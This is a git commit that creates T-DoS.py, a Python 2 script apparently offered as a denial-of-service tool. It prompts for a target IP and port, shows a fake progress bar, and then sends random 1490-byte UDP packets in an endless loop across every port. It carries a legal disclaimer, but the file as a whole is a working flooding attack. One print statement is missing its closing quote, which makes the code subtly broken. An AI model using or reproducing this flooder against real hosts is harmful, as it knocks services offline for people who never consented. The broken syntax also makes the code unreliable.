311a06bdcaa3eaa663137cae1ad9558221c12802
ParzivalKali <82817793+ParzivalHack@users.noreply.github.com>
2022-03-14 21:50:01 +0100

    Create T-DoS.py

---
+++ T-DoS.py
@@ -0,0 +1,54 @@
+print ("\033[91m")
+import sys
+import os
+import time
+import socket
+import random
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
+
+os.system("clear")
+os.system("figlet T-DoS")
+print
+print "Coded By : ParzivalHack"
+print "Github   : github.com/ParzivalHack"
+print "Disclaimer: Illicit use of this tool could lead to a violation of federal and local laws."
+print "Use this tool only on your own website or websites from which you have obtained permission."
+print "License: The source code of this tool is under the MIT License. © 2022 Tommaso Bona"
+print
+ip = raw_input("IP Target : ")
+port = input("Port       : ")
+os.system("clear")
+print("\033[93m")
+os.system("figlet DoS Attack")
+print("Coded by : ParzivalHack)
+print ("\033[92m")
+print "[                    ] 0% "
+time.sleep(5)
+print "[=====               ] 25%"
+time.sleep(5)
+print "[==========          ] 50%"
+time.sleep(5)
+print "[===============     ] 75%"
+time.sleep(5)
+print "[====================] 100%"
+time.sleep(3)
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1
